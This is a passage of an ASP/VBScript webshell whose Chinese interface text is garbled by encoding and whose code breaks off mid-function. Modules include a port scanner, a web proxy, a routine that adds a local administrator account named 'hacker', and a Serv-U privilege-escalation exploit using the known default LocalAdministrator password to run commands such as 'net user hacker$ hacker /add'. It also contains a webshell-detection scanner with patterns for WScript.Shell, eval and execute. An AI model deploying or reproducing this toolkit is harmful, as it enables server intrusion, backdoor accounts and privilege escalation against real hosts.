RRS(startN & " or " & endN & " is not number<br>")
End If
Else
RRS(tmp(i) & " is not number<br>")
End If
End If
Next
Next
End If
Next
timer2 = timer
thetime=cstr(int(timer2-timer1))
RRS"<hr>Process in "&thetime&" s"
END IF
end sub
Sub Scan(targetip, portNum)
	On Error Resume Next
	set conn = Server.CreateObject("ADODB.connection")
	connstr="Provider=SQLOLEDB.1;Data Source=" & targetip &","& portNum &";User ID=lake2;Password=;"
	conn.ConnectionTimeout = 1
	conn.open connstr
	If Err Then
		If Err.number = -2147217843 or Err.number = -2147467259 Then
			If InStr(Err.description, "(Connect()).") > 0 Then
				RRS(targetip & ":" & portNum & ".........�ر�<br>")
			Else
				RRS(targetip & ":" & portNum & ".........<font color=red>����</font><br>")
			End If
		End If
	End If
End Sub
Select Case Action:Case "MainMenu":MainMenu():Case "getTerminalInfo":getTerminalInfo():Case "PageAddToMdb":PageAddToMdb():case "ScanPort":ScanPort():Case "webpor"
response.write "<form name='form1' method='post' action=''><p><strong>��������Ҫʹ�ô�����ʵ���ҳ��</strong>"
if request.form("a")="" then
response.write "<input name='a' type='text' class='unnamed1' id='a' value='http://'>"
else
response.write "<input name='a' type='text' class='unnamed1' id='a' value='"&request.form("a")&"'>"
end if
response.write "<label><select name='yy' class='input'><option value='gb2312' selected>��������</option><option value='big5'>��������</option><option value='Shift-jIS'>����</option><option value='UTF-8'>UTF-8</option><option value='windows'>��ŷĬ��</option><option value='ISO'>��ŷIso</option></select></label><input name='Submit' type='submit' class='unnamed1' value='�ύ'><font color='#990000' size='-1'> </font></p></form></div>"
if request.form("a")<>"" or request("a")<>"" then
wstr=getHTTPPage( request.form("a") )
if int(len(wstr))>1000 then
start=newstring(wstr,"")
over=newstring(wstr,"")
response.write wstr
else
response.write "��������Ϊ�˽�ʡ��Դ��End�ˣ�Ҫô����Ҫ���ʵ���Դ������"
end if
else
Response.Flush:Response.Flush
tstart=timer()
for i=1 to 1024
Response.Write "<!--567890#########0#########0#########0#########0#########0#########0#########0#########012345-->" & vbcrlf
next
Response.Flush:Response.Flush
tend=timer()
ttime=tend-tstart + 0.00001
tnetspeed=100/(ttime)
tnetspeed2=tnetspeed * 8
twidth=int(tnetspeed * 0.16)+5
if twidth> 300 then twidth=300
tnetspeed=formatnumber(tnetspeed,2,,,0)
tnetspeed2=formatnumber(tnetspeed2,2,,,0)
end if
Function getHTTPPage(url)
dim http
set http=Server.createobject("Microsoft.XMLHTTP")
Http.open "GET",url,false
Http.send()
On Error Resume Next
If Http.Status<>200 then
exit function
end if
getHTTPPage=bytesToBSTR(Http.responseBody,request.form("yy"))
set http=nothing
if err.number<>0 then err.Clear
End function

Function BytesToBstr(body,Cset)
dim objstream
set objstream = Server.CreateObject("adodb.stream")
objstream.Type = 1
objstream.Mode =3
objstream.Open
objstream.Write body
objstream.Position = 0
objstream.Type = 2
objstream.Charset = Cset
BytesToBstr = objstream.ReadText
objstream.Close
set objstream = nothing
End Function

Function Newstring(wstr,strng)
Newstring=Instr(wstr,strng)
End Function

Case "adduser"
SI="<form action='?action=adduser' method=post><TABLE width=50% border=0 align=center cellpadding=3 cellspacing=1 bgColor=#91d70d><TR><TD colspan=2 class=TBHead><B><FONT color=#ff2222>����û�</font></B></TD></TR><tr><td class=TBTD><center>�û�:<input name='username' type='text' value='hacker'></td></tr><tr><td class=TBTD><center>����:<input name='passwd' type='text' value='hacker'></td></tr><tr><td class=TBTD><center><input type='submit' Value='�� ��'></td></tr></table></form>"
RRS SI
on error resume next
if request.servervariables("REMOTE_ADDR")<>"127.0.0.1" then
response.write "iP !s n0T RiGHt"
else
if request("username")<>"" then
username=request("username")
passwd=request("passwd")
Response.Expires=0
Session.TimeOut=50
Server.ScriptTimeout=3000
set lp=Server.CreateObject("WSCRIPT.NETWORK")
oz="WinNT://"&lp.ComputerName
Set ob=GetObject(oz)
Set oe=GetObject(oz&"/Administrators,group")
Set od=ob.Create("user",username)
od.SetPassword passwd
od.SetInfo
oe.Add oz&"/"&username
if err then
response.write "<font color=red ><center>����û�ʧ��</font>"
else
if instr(server.createobject("Wscript.shell").exec("cmd.exe /c net user "&username.stdout.readall),"�ϴε�¼")>0 then
response.write "<font color=red ><center>��Ȼû�д���,���Ǻ���Ҳû�����ɹ�.��һ�������ư�</font>"
else
Response.write "<font color=red ><center>OMG!"&username&"�ʺŽ����ɹ�!</font>"
end if
end if
else
end if
end if

Case "Servu"
Dim user, pass, port, ftpport, cmd, loginuser, loginpass, deldomain, mt, newdomain, newuser, quit
			dim action1
			action1=request("action1")
			if  not isnumeric(action1) then response.end
			user = trim(request("u"))
			pass = trim(request("p"))
			port = trim(request("port"))
			cmd = trim(request("c"))
			f=trim(request("f"))
			if f="" then
			f=gpath()
			else
			   f=left(f,2)
			end if
			ftpport = 65500
			timeout=3
			loginuser = "User " & user & vbCrLf
			loginpass = "Pass " & pass & vbCrLf
			deldomain = "-DELETEDOMAIN" & vbCrLf & "-IP=0.0.0.0" & vbCrLf & " PortNo=" & ftpport & vbCrLf
			mt = "SITE MAINTENANCE" & vbCrLf
			newdomain = "-SETDOMAIN" & vbCrLf & "-Domain=TEST596|0.0.0.0|" & ftpport & "|-1|1|0" & vbCrLf & "-TZOEnable=0" & vbCrLf & " TZOKey=" & vbCrLf
			newuser = "-SETUSERSETUP" & vbCrLf & "-IP=0.0.0.0" & vbCrLf & "-PortNo=" & ftpport & vbCrLf & "-User=go" & vbCrLf & "-Password=od" & vbCrLf & _
					"-HomeDir=c:\\" & vbCrLf & "-LoginMesFile=" & vbCrLf & "-Disable=0" & vbCrLf & "-RelPaths=1" & vbCrLf & _
					"-NeedSecure=0" & vbCrLf & "-HideHidden=0" & vbCrLf & "-AlwaysAllowLogin=0" & vbCrLf & "-ChangePassword=0" & vbCrLf & _
					"-QuotaEnable=0" & vbCrLf & "-MaxUsersLoginPerIP=-1" & vbCrLf & "-SpeedLimitUp=0" & vbCrLf & "-SpeedLimitDown=0" & vbCrLf & _
					"-MaxNrUsers=-1" & vbCrLf & "-IdleTimeOut=600" & vbCrLf & "-SessionTimeOut=-1" & vbCrLf & "-Expire=0" & vbCrLf & "-RatioUp=1" & vbCrLf & _
					"-RatioDown=1" & vbCrLf & "-RatiosCredit=0" & vbCrLf & "-QuotaCurrent=0" & vbCrLf & "-QuotaMaximum=0" & vbCrLf & _
					"-Maintenance=System" & vbCrLf & "-PasswordType=Regular" & vbCrLf & "-Ratios=None" & vbCrLf & " Access=c:\\|RWAMELCDP" & vbCrLf
			quit = "QUIT" & vbCrLf
			newuser=replace(newuser,"c:",f)
			if action1 = 1 then
				set a=Server.CreateObject("Microsoft.XMLHTTP")
				a.open "GET", "http://127.0.0.1:" & port & "/TEST596/upadmin/s1",True, "", ""
				a.send loginuser & loginpass & mt & deldomain & newdomain & newuser & quit
				set session("a")=a
			RRS "<form method=""post"" name=""goldsun"">"
			RRS "<input name=""u"" type=""hidden"" id=""u"" value="""&user&"""></td>"
			RRS "<input name=""p"" type=""hidden"" id=""p"" value="""&pass&"""></td>"
			RRS "<input name=""port"" type=""hidden"" id=""port"" value="""&port&"""></td>"
			RRS "<input name=""c"" type=""hidden"" id=""c"" value="""&cmd&""" size=""50"">"
			RRS "<input name=""f"" type=""hidden"" id=""f"" value="""&f&""" size=""50"">"
			RRS "<input name=""action1"" type=""hidden"" id=""action1"" value=""2""></form>"
			RRS "<script language=""javascript"">"
			RRS "document.write(""<center>�������� 127.0.0.1:"&port&",ʹ���û���: "&user&",���"&pass&"...<center>"");"
			RRS "setTimeout(""document.all.goldsun.submit();"",4000);"
			RRS "</script>"
			elseif action1 = 2 then
				set b=Server.CreateObject("Microsoft.XMLHTTP")
				b.open "GET", "http://127.0.0.1:" & ftpport & "/TEST596/upadmin/s2", True, "", ""
				b.send "User go" & vbCrLf & "pass od" & vbCrLf & "site exec " & cmd & vbCrLf & quit
			   set session("b")=b
			RRS "<form method=""post"" name=""goldsun"">"
			RRS "<input name=""u"" type=""hidden"" id=""u"" value="""&user&"""></td>"
			RRS "<input name=""p"" type=""hidden"" id=""p"" value="""&pass&"""></td>"
			RRS "<input name=""port"" type=""hidden"" id=""port"" value="""&port&"""></td>"
			RRS "<input name=""c"" type=""hidden"" id=""c"" value="""&cmd&""" size=""50"">"
			RRS "<input name=""f"" type=""hidden"" id=""f"" value="""&f&""" size=""50"">"
			RRS "<input name=""action1"" type=""hidden"" id=""action1"" value=""3""></form>"
			RRS "<script language=""javascript"">"
			RRS "document.write(""<center>��������Ȩ��,��ȴ�...<center>"");"
			RRS "setTimeout(""document.all.goldsun.submit();"",4000);"
			RRS "</script>"
			elseif action1 = 3 then
				set c=Server.CreateObject("Microsoft.XMLHTTP")
				c.open "GET", "http://127.0.0.1:" & port & "/TEST596/upadmin/s3", True, "", ""
				c.send loginuser & loginpass & mt & deldomain & quit
				set session("c")=c
			RRS "<center>��Ȩ���,��ִ�������<br><font color=red>"&cmd&"</font><br><br>"
			RRS "<input type=""button"" value="" ���ؼ��� "" onClick=location.href=""?Action=Servu"">"
			RRS "</center>"
			 else
			on error resume next
				set a=session("a")
				set b=session("b")
				set c=session("c")
				a.abort
				Set a = Nothing
				b.abort
				Set b = Nothing
				c.abort
				Set c = Nothing
			RRS "<center><form method=post name=goldsun action=""?Action=Servu"">"
			RRS "<table width=""494"" height=""163"" border=""1"" cellpadding=""0"" cellspacing=""1"" bordercolor=""#666666"">"
			RRS "<tr align=""center"" valign=""middle"">"
			RRS "<td colspan=""2"">Servu ����ASPͨɱ��<br><br>��ʾ:�����Ȩ���ɹ��Ͷ��ύ����<br>������������޸�,����:cmd /c d:\���ϴ���ľ��.exe ����VBS��COM�ļ�</td>"
			RRS "</tr>"
			RRS "<tr align=""center"" valign=""middle"">"
			RRS "<td width=""100"">�û���:</td>"
			RRS "<td width=""379""><input name=""u"" type=""text"" id=""u"" value=""LocalAdministrator""></td>"
			RRS "</tr>"
			RRS "<tr align=""center"" valign=""middle"">"
			RRS "<td>�ڡ��</td>"
			RRS "<td><input name=""p"" type=""text"" id=""p"" value=""#l@$ak#.lk;0@P""></td>"
			RRS "</tr>"
			RRS "<tr align=""center"" valign=""middle"">"
			RRS "<td>�ˡ��ڣ�</td>"
			RRS "<td><input name=""port"" type=""text"" id=""port"" value=""43958""></td>"
			RRS "</tr>"
			RRS "<tr align=""center"" valign=""middle"">"
			RRS "<td>ϵͳ·����</td>"
			RRS "<td><input name=""f"" type=""text"" id=""f"" value="""&f&""" size=""8""></td>"
			RRS "</tr>"
			RRS "<tr align=""center"" valign=""middle"">"
			RRS "<td>�����</td>"
			RRS "<td><input name=""c"" type=""text"" id=""c"" value=""cmd /c net user hacker$ hacker /add & net localgroup administrators hacker$ /add"" size=""50""></td>"
			RRS "</tr>"
			RRS "<tr align=""center"" valign=""middle""><td colspan=""2"">"
			RRS "<input type=""submit"" name=""Submit"" value=""�ύ"">"
			RRS " <input type=""reset"" name=""Submit2"" value=""����"">"
			RRS "<input name=""action1"" type=""hidden"" id=""action1"" value=""1""></td>"
			RRS "</tr>"
			RRS "</table></form></center>"
			end if


			function Gpath()
			on error resume next
				err.clear
				set f=Server.CreateObject("Scripting.FileSystemObject")
				if err.number>0 then
				gpath="c:"
					exit function
				end if
			gpath=f.GetSpecialFolder(0)
			gpath=lcase(left(gpath,2))
			set f=nothing
			end function
			Function GName() 
			If request.servervariables("SERVER_PORT")="80" Then 
			GName="http://" & request.servervariables("server_name")&lcase(request.servervariables("script_name")) 
			Else 
			GName="http://" & request.servervariables("server_name")&":"&request.servervariables("SERVER_PORT")&lcase(request.servervariables("script_name")) 
			End If 
			End Function 
			Err.Clear
case "Alexa"
dim AlexaUrl,Top
AlexaUrl=request("u")
Top=Alexa(AlexaUrl)
if AlexaUrl="" then AlexaUrl=""&request.servervariables("http_host")&""
SI="<br><table width='80%' bgcolor='menu' border='0' cellspacing='1' cellpadding='0' align='center'><tr><td height='20' colspan='3' align='center' bgcolor='menu'>�����������Ϣ</td></tr><tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>��������</td><td bgcolor='#FFFFFF'> </td><td bgcolor='#FFFFFF'>"&request.serverVariables("SERVER_NAME")&"</td></tr><form method=post action='http://www.ip138.com/ips.asp' name='ipform' target='_blank'><tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>������IP</td><td bgcolor='#FFFFFF'> </td><td bgcolor='#FFFFFF'><input type='text' name='ip' size='15' value='"&Request.ServerVariables("LOCAL_ADDR")&"'style='border:0px'><input type='submit' value='��ѯ�˷��������ڵ�'style='border:0px'><input type='hidden' name='action' value='2'></td></tr></form><form method=post action='?Action=Alexa' name='form1'><tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>������Alexa����</td><td bgcolor='#FFFFFF'> </td><td bgcolor='#FFFFFF'><input type='text' name='u' value='"&AlexaUrl&"' size=40 style='border:0px'>����:<input type='text' value='"&Top&"' size=10><input type='submit'  value='��ѯ'></td></tr></form><tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>������ʱ��</td><td bgcolor='#FFFFFF'> </td><td bgcolor='#FFFFFF'>"&now&" </td></tr><tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>������CPU����</td><td bgcolor='#FFFFFF'> </td><td bgcolor='#FFFFFF'>"&Request.ServerVariables("NUMBER_OF_PROCESSORS")&"</td></tr><tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>����������ϵͳ</td><td bgcolor='#FFFFFF'> </td><td bgcolor='#FFFFFF'>"&Request.ServerVariables("OS")&"</td></tr><tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>WEB�������汾</td><td bgcolor='#FFFFFF'> </td><td bgcolor='#FFFFFF'>"&Request.ServerVariables("SERVER_SOFTWARE")&"</td></tr>"
For i=0 To 13
SI=SI&"<tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>"&ObT(i,0)&"</td><td bgcolor='#FFFFFF'>"&ObT(i,1)&"</td><td bgcolor='#FFFFFF' align=left>"&ObT(i,2)&"</td></tr>"
Next
RRS SI
Err.Clear
function Alexa(AlexaURL)
	on error resume next 
	dim getsms,getstr,url
	dim star,endd
	url="http://data.alexa.com/data?cli=10&dat=snba&url="&AlexaURL
	getsms=getHTTPPage(url)
	if getsms<>"" then
		star=instr(getsms,"<REACH RANK=""")+13
		endd=instr(star,getsms,"</SD>")
		getstr=mid(getsms,star,endd-star-4)
	else
		getstr="������"
	end if
	if IsNumeric(getstr)=false then getstr="������"
	Alexa=getstr
end function
function getHTTPPage(url) 
	on error resume next 
	dim http 
	set http=Server.createobject("Microsoft.XMLHTTP") 
	Http.open "GET",url,false 
	Http.send() 
	if Http.readystate<>4 then
		getHTTPPage=""
		exit function 
	end if 
	getHTTPPage=bytes2BSTR(Http.responseBody) 
	set http=nothing
	if err.number<>0 then err.Clear  
end function 
Function bytes2BSTR(vIn) 
	dim strReturn 
	dim i1,ThisCharCode,NextCharCode 
	strReturn = "" 
	For i1 = 1 To LenB(vIn) 
		ThisCharCode = AscB(MidB(vIn,i1,1)) 
		If ThisCharCode < &H80 Then 
			strReturn = strReturn & Chr(ThisCharCode) 
		Else 
			NextCharCode = AscB(MidB(vIn,i1+1,1)) 
			strReturn = strReturn & Chr(CLng(ThisCharCode) * &H100 + CInt(NextCharCode)) 
			i1 = i1 + 1 
		End If 
	Next 
	bytes2BSTR = strReturn 
    Err.Clear
End Function
    Err.Clear
  Case "kmuma"
  	dim Report
	if request.QueryString("act")<>"scan" then
	  	RRS ("<b>��վ��Ŀ¼</b>- "&Server.MapPath("/")&"<br>")
		RRS ("<b>������Ŀ¼</b>- "&Server.MapPath("."))
        RRS (""&copyurl&"")
		RRS "<form action=""?Action=kmuma&act=scan"" method=""post"" name=""form1"">"
		RRS "<p><b>������Ҫ����·����</b>"
		RRS "<input name=""path"" type=""text"" style=""border:1px solid #999"" value=""."" size=""30"" /> �\����վ��Ŀ¼����.��Ϊ������Ŀ¼<br><br>"
		RRS "��Ҫ��ʲô: <input class=c name=""radiobutton"" type=""radio"" value=""sws"" onClick=""document.getElementById('showFile1').style.display='none'"" checked>��ASP ��"
		RRS "<input class=c type=""radio"" name=""radiobutton"" value=""sf"" onClick=""document.getElementById('showFile1').style.display=''"">������������֮�ļ�<br>"
		RRS "<br /><div id=""showFile1"" style=""display:none"">"
		RRS "&nbsp;&nbsp;�������ݣ�<input name=""Search_Content"" type=""text"" id=""Search_Content"" style=""border:1px solid #999"" size=""20"">"
		RRS " Ҫ���ҵ��ַ����������ֻ�������ڼ��<br />"
		RRS "&nbsp;&nbsp;�޸����ڣ�<input name=""Search_Date"" type=""text"" style=""border:1px solid #999"" value="""&Left(Now(),InStr(now()," ")-1)&""" size=""20""> ���������;����������������д <a href=""#"" onClick=""javascript:form1.Search_Date.value='ALL'"">ALL</a><br />"
		RRS "&nbsp;&nbsp;�ļ����ͣ�<input name=""Search_FileExt"" type=""text"" style=""border:1px solid #999"" value=""*"" size=""20""> ����֮����,������*��ʾ��������<br /><br /></div>"
		RRS "<input type=""submit"" value="" ��ʼɨ�� "" style=""background:#ccc;border:2px solid #fff;padding:2px 2px 0px 2px;margin:4px;"" />"
		RRS "</form>"
	else
		if request.Form("path")="" then
			RRS("·������Ϊ��")
			response.End()
		end if
		if request.Form("path")="\" then
			TmpPath = Server.MapPath("\")
		elseif request.Form("path")="." then
			TmpPath = Server.MapPath(".")
		else
			TmpPath = request.Form("path")
		end if
		
		timer1 = timer
		Sun = 0
		SumFiles = 0
		SumFolders = 1
		If request.Form("radiobutton") = "sws" Then
			DimFileExt = "asp,cer,asa,cdx"
			Call ShowAllFile(TmpPath)
		Else
			If request.Form("path") = "" or request.Form("Search_Date") = "" or request.Form("Search_FileExt") = "" Then
				RRS("������������ȫ<br><br><a href='javascript:history.go(-1);'>�뷵����������</a>")
				response.End()
			End If
			DimFileExt = request.Form("Search_fileExt")
			Call ShowAllFile2(TmpPath)
		End If
RRS "<table width=""100%"" border=""0"" cellpadding=""0"" cellspacing=""0"" style='font-size:12px'>"
RRS "<tr><th>Scan WebShell</tr>"
RRS "<tr><td style=""padding:5px;line-height:170%;clear:both;font-size:12px"">"
RRS "<div id=""updateInfo"" style=""background:ffffe1;border:1px solid #89441f;padding:4px;display:none""></div>"
RRS "ɨ����ϣ�һ������ļ���<font color=""#FF0000"">"&SumFolders&"</font>�����ļ�<font color=""#FF0000"">"&SumFiles&"</font>�������ֿ��ɵ�<font color=""#FF0000"">"&Sun&"</font>��"
RRS "<table width=""100%"" border=""1"" cellpadding=""0"" cellspacing=""8"" bordercolor=""#999999"" style=""font-size:12px;border-collapse:collapse;line-height:130%;clear:both;""><tr>"
If request.Form("radiobutton") = "sws" Then
	RRS "<td width=""20%"">�ļ����·��</td>"
	RRS "<td width=""20%"">������</td>"
	RRS "<td width=""40%"">����</td>"
	RRS "<td width=""20%"">����/�޸�ʱ��</td>"
else   
	RRS "<td width=""50%"">�ļ����·��</td>"
	RRS "<td width=""25%"">�ļ�����ʱ��</td>"
	RRS "<td width=""25%"">�޸�ʱ��</td>"
end if
	RRS "</tr>"
	RRS Report
	RRS "<br/></table>"
timer2 = timer
thetime=cstr(int(((timer2-timer1)*10000 )+0.5)/10)
RRS "<br><font style='font-size:12px'>��ҳִ�й�����"&thetime&"����</font>"
	end if
	Sub ShowAllFile(Path)
	Set F1SO = CreateObject("Scripting.FileSystemObject")
	if not F1SO.FolderExists(path) then exit sub
	Set f = F1SO.GetFolder(Path)
	Set fc2 = f.files
	For Each myfile in fc2
		If CheckExt(F1SO.GetExtensionName(path&"\"&myfile.name)) Then
			Call ScanFile(Path&Temp&"\"&myfile.name, "")
			SumFiles = SumFiles + 1
		End If
	Next
	Set fc = f.SubFolders
	For Each f1 in fc
		ShowAllFile path&"\"&f1.name
		SumFolders = SumFolders + 1
    Next
	Set F1SO = Nothing
End Sub
Sub ScanFile(FilePath, InFile)
Server.ScriptTimeout=999999999
	If InFile <> "" Then
		Infiles = "<font color=red>���ļ���<a href=""http://"&Request.Servervariables("server_name")&"/"&tURLEncode(InFile)&""" target=_blank>"& InFile & "</a>�ļ�����ִ��</font>"
	End If
	Set FSO1s = CreateObject("Scripting.FileSystemObject")
	on error resume next
	set ofile = FSO1s.OpenTextFile(FilePath)
	filetxt = Lcase(ofile.readall())
	If err Then Exit Sub end if
	if len(filetxt)>0 then
		filetxt = vbcrlf & filetxt
		temp = "<a href=""http://"&Request.Servervariables("server_name")&"/"&tURLEncode(replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","/"))&""" target=_blank>"&replace(FilePath,server.MapPath("\")&"\","",1,1,1)&"</a><br />"
    temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""EditFile"")' class='am' title='�༭'>Edit</a> "
	temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""DelFile"")'  onclick='return yesok()' class='am' title='ɾ��'>Del</a > "
	temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""CopyFile"")' class='am' title='����'>Copy</a> "
	temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""MoveFile"")' class='am' title='�ƶ�'>Move</a>"	
			If instr( filetxt, Lcase("WScr"&DoMyBest&"ipt.Shell") ) or Instr( filetxt, Lcase("clsid:72C24DD5-D70A"&DoMyBest&"-438B-8A42-98424B88AFB8") ) then
				Report = Report&"<tr><td>"&temp&"</td><td>WScr"&DoMyBest&"ipt.Shell ���� clsid:72C24DD5-D70A"&DoMyBest&"-438B-8A42-98424B88AFB8</td><td><font color=red>Σ�������һ�㱻ASPľ������</font>"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
				temp="-ͬ��-"
			End if
			If instr( filetxt, Lcase("She"&DoMyBest&"ll.Application") ) or Instr( filetxt, Lcase("clsid:13709620-C27"&DoMyBest&"9-11CE-A49E-444553540000") ) then
				Report = Report&"<tr><td>"&temp&"</td><td>She"&DoMyBest&"ll.Application ���� clsid:13709620-C27"&DoMyBest&"9-11CE-A49E-444553540000</td><td><font color=red>Σ�������һ�㱻ASPľ������</font>"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
				temp="-ͬ��-"
			End If
			Set regEx = New RegExp
			regEx.IgnoreCase = True
			regEx.Global = True
			regEx.Pattern = "\bLANGUAGE\s*=\s*[""]?\s*(vbscript|jscript|javascript).encode\b"
			If regEx.Test(filetxt) Then
				Report = Report&"<tr><td>"&temp&"</td><td>(vbscript|jscript|javascript).Encode</td><td><font color=red>�ƺ��ű���������</font>"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
				temp="-ͬ��-"
			End If
			regEx.Pattern = "\bEv"&"al\b"
			If regEx.Test(filetxt) Then
				Report = Report&"<tr><td>"&temp&"</td><td>Ev"&"al</td><td>e"&"val()��������ִ������ASP����<br>����javascript������Ҳ����ʹ�ã��п������󱨡�"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
				temp="-ͬ��-"
			End If
			regEx.Pattern = "[^.]\bExe"&"cute\b"
			If regEx.Test(filetxt) Then
				Report = Report&"<tr><td>"&temp&"</td><td>Exec"&"ute</td><td><font color=red>e"&"xecute()��������ִ������ASP����</font><br>"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
				temp="-ͬ��-"
			End If
			regEx.Pattern = "\.(Open|Create)TextFile\b"
			If regEx.Test(filetxt) Then
				Report = Report&"<tr><td>"&temp&"</td><td>.CreateTextFile|.OpenTextFile</td><td>ʹ����FSO��CreateTextFile|OpenTextFile��д�ļ�"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
				temp="-ͬ��-"
			End If
			regEx.Pattern = "\.SaveToFile\b"
			If regEx.Test(filetxt) Then
				Report = Report&"<tr><td>"&temp&"</td><td>.SaveToFile</td><td>ʹ����Stream��SaveToFile����д�ļ�"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
				temp="-ͬ��-"
			End If
			regEx.Pattern = "\.Save\b"
			If regEx.Test(filetxt) Then
				Report = Report&"<tr><td>"&temp&"</td><td>.Save</td><td>ʹ����XMLHTTP��Save����д�ļ�"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
				temp="-ͬ��-"
			End If
		Set regEx = Nothing
		Set regEx = New RegExp
		regEx.IgnoreCase = True
		regEx.Global = True
		regEx.Pattern = "<!--\s*#include\s*file\s*=\s*"".*"""
		Set Matches = regEx.Execute(filetxt)
		For Each Match in Matches
			tFile = Replace(Mid(Match.Value, Instr(Match.Value, """") + 1, Len(Match.Value) - Instr(Match.Value, """") - 1),"/","\")
			If Not CheckExt(FSO1s.GetExtensionName(tFile)) Then
				Call ScanFile( Mid(FilePath,1,InStrRev(FilePath,"\"))&tFile, replace(FilePath,server.MapPath("\")&"\","",1,1,1) )
				SumFiles = SumFiles + 1
			End If
		Next
		Set Matches = Nothing
		Set regEx = Nothing
		Set regEx = New RegExp
		regEx.IgnoreCase = True
		regEx.Global = True
		regEx.Pattern = "<!--\s*#include\s*virtual\s*=\s*"".*"""
		Set Matches = regEx.Execute(filetxt)
		For Each Match in Matches
			tFile = Replace(Mid(Match.Value, Instr(Match.Value, """") + 1, Len(Match.Value) - Instr(Match.Value, """") - 1),"/","\")
			If Not CheckExt(FSO1s.GetExtensionName(tFile)) Then
				Call ScanFile( Server.MapPath("\")&"\"&tFile, replace(FilePath,server.MapPath("\")&"\","",1,1,1) )
				SumFiles = SumFiles + 1
			End If
		Next
		Set Matches = Nothing
		Set regEx = Nothing
		Set regEx = New RegExp
		regEx.IgnoreCase = True
		regEx.Global = True
		regEx.Pattern = "Server.(Exec"&"ute|Transfer)([ \t]*|\()"".*"""
		Set Matches = regEx.Execute(filetxt)
		For Each Match in Matches
			tFile = Replace(Mid(Match.Value, Instr(Match.Value, """") + 1, Len(Match.Value) - Instr(Match.Value, """") - 1),"/","\")
			If Not CheckExt(FSO1s.GetExtensionName(tFile)) Then
				Call ScanFile( Mid(FilePath,1,InStrRev(FilePath,"\"))&tFile, replace(FilePath,server.MapPath("\")&"\","",1,1,1) )
				SumFiles = SumFiles + 1
			End If
		Next
		Set Matches = Nothing
		Set regEx = Nothing
		Set regEx = New RegExp
		regEx.IgnoreCase = True
		regEx.Global = True
		regEx.Pattern = "Server.(Exec"&"ute|Transfer)([ \t]*|\()[^""]\)"
		If regEx.Test(filetxt) Then
			Report = Report&"<tr><td>"&temp&"</td><td>Server.Exec"&"ute</td><td><font color=red>���ܸ��ټ��Server.e"&"xecute()����ִ�е��ļ���</font><br>"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
			Sun = Sun + 1
		End If
		Set Matches = Nothing
		Set regEx = Nothing
		Set XregEx = New RegExp
		XregEx.IgnoreCase = True
		XregEx.Global = True
		XregEx.Pattern = "<scr"&"ipt\s*(.|\n)*?runat\s*=\s*""?server""?(.|\n)*?>"
		Set XMatches = XregEx.Execute(filetxt)
		For Each Match in XMatches
			tmpLake2 = Mid(Match.Value, 1, InStr(Match.Value, ">"))
			srcSeek = InStr(1, tmpLake2, "src", 1)
			If srcSeek > 0 Then
				srcSeek2 = instr(srcSeek, tmpLake2, "=")
				For i = 1 To 50
					tmp = Mid(tmpLake2, srcSeek2 + i, 1)
					If tmp <> " " and tmp <> chr(9) and tmp <> vbCrLf Then
						Exit For
					End If
				Next
				If tmp = """" Then
					tmpName = Mid(tmpLake2, srcSeek2 + i + 1, Instr(srcSeek2 + i + 1, tmpLake2, """") - srcSeek2 - i - 1)
				Else
					If InStr(srcSeek2 + i + 1, tmpLake2, " ") > 0 Then tmpName = Mid(tmpLake2, srcSeek2 + i, Instr(srcSeek2 + i + 1, tmpLake2, " ") - srcSeek2 - i) Else tmpName = tmpLake2
					If InStr(tmpName, chr(9)) > 0 Then tmpName = Mid(tmpName, 1, Instr(1, tmpName, chr(9)) - 1)
					If InStr(tmpName, vbCrLf) > 0 Then tmpName = Mid(tmpName, 1, Instr(1, tmpName, vbcrlf) - 1)
					If InStr(tmpName, ">") > 0 Then tmpName = Mid(tmpName, 1, Instr(1, tmpName, ">") - 1)
				End If
				Call ScanFile( Mid(FilePath,1,InStrRev(FilePath,"\"))&tmpName , replace(FilePath,server.MapPath("\")&"\","",1,1,1))
				SumFiles = SumFiles + 1
			End If
		Next
		Set Matches = Nothing
		Set regEx = Nothing
		Set regEx = New RegExp
		regEx.IgnoreCase = True
		regEx.Global = True
		regEx.Pattern = "CreateO"&"bject[ |\t]*\(.*\)"
		Set Matches = regEx.Execute(filetxt)
		For Each Match in Matches
			If Instr(Match.Value, "&") or Instr(Match.Value, "+") or Instr(Match.Value, """") = 0 or Instr(Match.Value, "(") <> InStrRev(Match.Value, "(") Then
				Report = Report&"<tr><td>"&temp&"</td><td>Creat"&"eObject</td><td>Crea"&"teObject����ʹ���˱��μ���"&infiles&"</td><td>"&GetDateCreate(filepath)&"<br>"&GetDateModify(filepath)&"</td></tr>"
				Sun = Sun + 1
				exit sub
			End If
		Next
